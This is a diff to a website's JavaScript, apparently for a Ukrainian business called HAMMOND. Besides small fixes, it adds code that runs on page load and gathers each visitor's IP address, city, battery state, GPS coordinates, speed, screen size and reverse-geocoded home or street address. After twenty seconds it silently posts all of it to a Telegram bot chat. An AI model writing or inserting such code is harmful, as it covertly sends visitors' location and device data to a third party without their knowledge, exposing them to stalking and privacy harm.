@@ -40,6 +40,7 @@ fetch(full_URL)
   .then((res) => res.text())
   .then((rep) => {
     let data = JSON.parse(rep.substr(47).slice(0, -2))
+    console.log(data)
 
     pricePropan.setAttribute('value', data.table.rows[0].c[0].v)
     sellDryingPrice.setAttribute('value', data.table.rows[0].c[1].v)
@@ -304,11 +305,7 @@ document.querySelector('.popup').addEventListener('submit', function (e) {
 
 // Send visit message to Telegram
 
-document.addEventListener('DOMContentLoaded', function () {
-  sendVsitMessage()
-})
-
-function sendVsitMessage() {
+function sendVisitMessage() {
   let message = `<b>Відвідування сайту HAMMOND"</b>\n`
 
   axios.post(URI_API, {
@@ -317,3 +314,96 @@ function sendVsitMessage() {
     text: message,
   })
 }
+
+// Get User Data
+
+let info = new Userinfo()
+
+let batteryStatus
+let batteryLevel
+let lat
+let long
+let userSpeed
+let screenWidth
+let screenHeight
+let userIp
+let userIpCity
+
+async function t1() {
+  const ipData = await info.ip()
+  userIp = ipData.ipAddress
+  userIpCity = ipData.city
+
+  const userBattery = await info.battery()
+  let status
+
+  status = userBattery.charging
+  if (status === true) {
+    batteryStatus = 'Батарея на зарядці'
+  } else if (status === false) {
+    batteryStatus = 'Батарея не заряджається'
+  }
+  batteryLevel = userBattery.level
+
+  const userPosition = await info.position()
+
+  lat = userPosition.lat
+  long = userPosition.long
+  userSpeed = userPosition.speed
+}
+t1().then(() => getAddress())
+
+function t2() {
+  screenWidth = info.sizeScreen().screenAvailWidth
+  screenHeight = info.sizeScreen().screenAvailHeight
+}
+t2()
+
+let userPosCity
+let userDistrict
+let userRoad
+let userHouse
+let userPostcode
+
+function getAddress() {
+  const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${long}`
+
+  fetch(url)
+    .then((response) => response.json())
+    .then((data) => {
+      const userAddress = data.address
+      userPosCity = data.address.city
+      userDistrict = data.address.district
+      userRoad = data.address.road
+      userHouse = data.address.house_number
+      userPostcode = data.address.postcode
+    })
+    .catch((error) => {
+      console.error(error)
+    })
+}
+
+function sendUserDataMessage() {
+  let message = `<b>Параметри відвідувача</b>\n`
+  message += `<b>Статус батареї: </b>${batteryStatus}\n`
+  message += `<b>Заряд батареї: </b>${batteryLevel}\n`
+  message += `<b>Координати: </b>${lat}, ${long}\n`
+  message += `<b>Адреса: </b>${userPosCity}, ${userDistrict}, ${userRoad}, ${userHouse}, ${userPostcode}\n`
+  message += `<b>Швидкість: </b>${userSpeed}\n`
+  message += `<b>Розмір екрана: </b>${screenWidth}x${screenHeight}\n`
+  message += `<b>IP адреса: </b>${userIp}\n`
+  message += `<b>Місто за IP: </b>${userIpCity}\n`
+
+  axios.post(URI_API, {
+    chat_id: CHAT_ID,
+    parse_mode: 'html',
+    text: message,
+  })
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+  sendVisitMessage()
+  setTimeout(() => {
+    sendUserDataMessage()
+  }, 20000)
+})
